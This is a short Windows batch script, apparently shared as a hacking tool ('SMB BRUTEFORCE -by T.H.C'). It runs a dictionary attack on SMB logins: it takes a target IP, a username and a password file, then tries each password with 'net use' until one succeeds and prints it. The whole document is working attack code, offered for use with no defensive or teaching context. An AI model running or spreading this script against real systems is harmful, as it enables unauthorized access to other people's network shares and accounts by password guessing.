@echo off
title SMB BRUTEFORCE -by T.H.C
color a
echo                                 SMB BRUTE FORCER                    
set /p ip="Enter IP Address: "
set /p user="Username: "
set /p wordlist="Enter Password List: "

for /f %%a in (%wordlist%) do (
echo %%a
 set pass=%%a
 call :attempt
)
echo Password not found :(
pause
exit


:success
echo Password Found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit



:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% equ 0 goto success